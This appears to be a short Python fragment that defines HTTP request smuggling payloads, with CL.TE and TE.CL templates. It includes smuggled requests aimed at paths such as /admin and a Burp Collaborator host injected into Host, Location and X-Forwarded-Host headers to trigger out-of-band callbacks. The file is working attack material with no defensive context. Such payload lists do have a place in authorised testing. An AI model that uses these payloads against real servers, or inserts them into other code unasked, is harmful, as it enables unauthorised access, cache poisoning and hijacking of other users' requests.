
http_version=["1.0","1.1"]
smuggle_dir=["/ping","/robots.txt","/please404","/%c0","/admin"]
RN="\r\n"
Smuggled_Host="5147cjcqah3lncjvuelm0u1uplvbj0.burpcollaborator.net"
Payloads_CLTE=["GET __DIR__ HTTP/__HTTP_VERSION__"+RN+"X:X",

	"GET __DIR__ HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__"+RN+"X:X",

	"GET / HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__."+Smuggled_Host+RN+"X:X",

	"GET / HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__"+RN+"Location: https://"+Smuggled_Host+RN+"X:X",

	"GET / HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__."+Smuggled_Host+RN+"X-Forwarded-Host: https://"+Smuggled_Host+RN+"X:X"


]


Payloads_TECL=["POST __DIR__ HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__"+RN+"Content-Type: application/x-www-form-urlencoded"+RN+"Content-Length: 15"+RN+RN+"x=1",

"POST / HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__."+Smuggled_Host+RN+"Content-Type: application/x-www-form-urlencoded"+RN+"Content-Length: 15"+RN+RN+"x=1",

"APOST / HTTP/__HTTP_VERSION__"+RN+"Content-Type: application/x-www-form-urlencoded"+RN+"Content-Length: 15"+RN+RN+"x=1",

"POST __DIR__ HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__"+RN+"Content-Type: application/json"+RN+"Content-Length: 15"+RN+RN+"x=1",


]
